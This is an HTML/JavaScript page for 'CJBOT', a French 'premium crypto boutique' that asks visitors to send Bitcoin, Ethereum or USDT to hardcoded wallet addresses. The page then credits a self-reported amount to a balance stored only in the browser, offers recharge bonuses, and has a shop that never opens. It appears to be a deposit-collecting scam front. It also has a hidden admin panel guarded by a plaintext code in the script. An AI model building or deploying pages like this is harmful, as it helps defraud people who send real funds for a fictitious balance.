<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CJBOT</title>

<style>
body{
margin:0;
font-family:-apple-system,BlinkMacSystemFont,sans-serif;
background:radial-gradient(circle at top,#1e293b,#0b1220 70%);
color:white;
}
.app{padding:24px;}
.header{text-align:center;margin-bottom:40px;}
.avatar{
width:80px;height:80px;
background:linear-gradient(135deg,#3b82f6,#2563eb);
border-radius:50%;
margin:auto;
display:flex;
align-items:center;
justify-content:center;
font-size:28px;
font-weight:bold;
cursor:pointer;
}
.card{
background:rgba(255,255,255,0.05);
backdrop-filter:blur(15px);
border-radius:16px;
padding:20px;
margin-bottom:20px;
border:1px solid rgba(255,255,255,0.08);
}
.balance{display:flex;justify-content:space-between;font-size:18px;}
.amount{color:#3b82f6;font-weight:600;}
.actions button,
.modal-content button{
width:100%;
padding:14px;
margin-bottom:12px;
border-radius:14px;
border:none;
background:linear-gradient(90deg,#3b82f6,#2563eb);
color:white;
font-size:16px;
font-weight:600;
cursor:pointer;
}
.modal{
display:none;
position:fixed;
inset:0;
background:rgba(0,0,0,0.6);
backdrop-filter:blur(10px);
justify-content:center;
align-items:center;
}
.modal-content{
background:#111827;
padding:25px;
border-radius:20px;
width:85%;
max-width:350px;
text-align:center;
}
.close-btn{background:#374151;}
input{
width:100%;
padding:12px;
margin-bottom:12px;
border-radius:10px;
border:none;
}
</style>
</head>

<body>

<div class="app">
<div class="header">
<div class="avatar">CJ</div>
<h1>CJBOT</h1>
<p>Boutique Premium Crypto</p>
</div>

<div class="card balance">
<span>Solde</span>
<span class="amount" id="balance">0.00€</span>
</div>

<div class="card">
<h3>Programme fidélité</h3>
<p>Pour chaque 500€ rechargés, recevez 90€ bonus.</p>
</div>

<div class="actions">
<button onclick="openShop()">🛒 Ouvrir la boutique</button>
<button onclick="recharge()">💳 Recharger</button>
<button onclick="support()">📩 Support</button>
</div>
</div>

<div id="depositModal" class="modal">
<div class="modal-content" id="modalContent"></div>
</div>

<script>

/* ================= CONFIG ================= */

const ADMIN_CODE="CJ2026";

const addresses={
BTC:"bc1q2kd0kpzmvr9nz6xhwgvjpk7kapcw3wd9r6wjzz",
ETH:"0x5A652C891ee6F1cAF45c829A0e42f81856524939",
USDT:"0x5A652C891ee6F1cAF45c829A0e42f81856524939"
};

/* ================= INIT ================= */

let balance=parseFloat(localStorage.getItem("balance"))||0;
let totalDeposited=parseFloat(localStorage.getItem("totalDeposited"))||0;
let bonusGiven=parseInt(localStorage.getItem("bonusGiven"))||0;
let history=JSON.parse(localStorage.getItem("history"))||[];
updateUI();

/* ================= UI ================= */

function updateUI(){
document.getElementById("balance").innerText=balance.toFixed(2)+"€";
localStorage.setItem("balance",balance);
}

/* ================= MODAL ================= */

function recharge(){
resetModal();
document.getElementById("depositModal").style.display="flex";
}

function closeModal(){
document.getElementById("depositModal").style.display="none";
}

function resetModal(){
document.getElementById("modalContent").innerHTML=`
<h3>Choisir un dépôt</h3>
<button onclick="selectCrypto('BTC')">₿ Bitcoin</button>
<button onclick="selectCrypto('ETH')">Ξ Ethereum</button>
<button onclick="selectCrypto('USDT')">₮ USDT (ERC20)</button>
<button class="close-btn" onclick="closeModal()">Fermer</button>
`;
}

function selectCrypto(crypto){
document.getElementById("modalContent").innerHTML=`
<h3>Dépôt ${crypto}</h3>
<p style="word-break:break-all;margin:15px 0;font-size:14px;">
${addresses[crypto]}
</p>
<input type="number" id="depositAmount" placeholder="Montant en €">
<button onclick="confirmDeposit()">Confirmer réception</button>
<button onclick="copyAddress('${addresses[crypto]}')">Copier adresse</button>
<button onclick="resetModal()">⬅ Retour</button>
<button class="close-btn" onclick="closeModal()">Fermer</button>
`;
}

function copyAddress(addr){
navigator.clipboard.writeText(addr);
alert("Adresse copiée");
}

/* ================= DEPOT ================= */

function confirmDeposit(){

const amount=parseFloat(document.getElementById("depositAmount").value);
if(!amount||amount<=0){alert("Montant invalide");return;}

const normalBonus=90;
const promoBonus=120;
const forcedPromo=localStorage.getItem("forcePromo")==="true";

const promoEnd=new Date("2026-04-01").getTime();
const now=Date.now();
const activeBonus=(now<promoEnd||forcedPromo)?promoBonus:normalBonus;

balance+=amount;
totalDeposited+=amount;

const milestone=Math.floor(totalDeposited/500);
let bonus=0;

if(milestone>bonusGiven){
const newMilestones=milestone-bonusGiven;
bonus=newMilestones*activeBonus;
balance+=bonus;
bonusGiven=milestone;
}

history.push({
amount:amount,
bonus:bonus,
date:new Date().toLocaleString()
});

localStorage.setItem("history",JSON.stringify(history));
localStorage.setItem("totalDeposited",totalDeposited);
localStorage.setItem("bonusGiven",bonusGiven);

updateUI();
closeModal();
alert("Solde crédité !");
}

/* ================= ADMIN PANEL ================= */

let avatarClicks=0;

document.querySelector(".avatar").addEventListener("click",()=>{
avatarClicks++;
if(avatarClicks>=5){
avatarClicks=0;
openAdminLogin();
}
setTimeout(()=>avatarClicks=0,2000);
});

function openAdminLogin(){
const code=prompt("Code admin :");
if(code===ADMIN_CODE){
openAdminPanel();
}
}

function openAdminPanel(){
document.getElementById("modalContent").innerHTML=`
<h3>Panneau Admin</h3>
<button onclick="adminCredit()">➕ Créditer</button>
<button onclick="adminDebit()">➖ Débiter</button>
<button onclick="togglePromo()">🔥 Activer/Désactiver Promo</button>
<button onclick="resetHistory()">🗑 Reset Historique</button>
<button onclick="showStats()">📊 Statistiques</button>
<button class="close-btn" onclick="closeModal()">Fermer</button>
`;
document.getElementById("depositModal").style.display="flex";
}

function adminCredit(){
const amount=parseFloat(prompt("Montant à ajouter :"));
if(!amount)return;
balance+=amount;
updateUI();
alert("Crédit ajouté");
}

function adminDebit(){
const amount=parseFloat(prompt("Montant à retirer :"));
if(!amount)return;
balance-=amount;
if(balance<0)balance=0;
updateUI();
alert("Débit effectué");
}

function togglePromo(){
let promo=localStorage.getItem("forcePromo")==="true";
localStorage.setItem("forcePromo",!promo);
alert("Promo "+(!promo?"Activée":"Désactivée"));
}

function resetHistory(){
localStorage.clear();
balance=0;
totalDeposited=0;
bonusGiven=0;
history=[];
updateUI();
alert("Reset effectué");
}

function showStats(){
alert(
"Solde: "+balance+"€\n"+
"Total Déposé: "+totalDeposited+"€\n"+
"Transactions: "+history.length
);
}

/* ================= AUTRES ================= */

function openShop(){alert("Boutique bientôt disponible");}
function support(){alert("Contact support");}

</script>
</body>
</html>
